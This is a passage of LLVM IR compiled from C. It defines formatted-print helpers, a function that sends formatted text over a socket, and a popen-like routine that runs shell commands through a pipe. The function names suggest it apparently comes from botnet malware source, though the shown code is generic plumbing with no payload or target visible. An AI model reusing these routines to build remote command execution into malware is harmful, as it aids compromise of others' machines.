  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @zprintf(i8* %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @print(i8** %0, i8* %1, %struct.__va_list_tag* %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !13

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @szprintf(i8* %0, i8* %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sockprintf(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias align 16 i8* @malloc(i64 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i64 0, i64 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #11
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #12
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpopen(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias align 16 i8* @malloc(i64 %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0), i8* %99, i8* null) #12
  call void @_exit(i32 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #12
  %26 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %7, i32 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !14

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
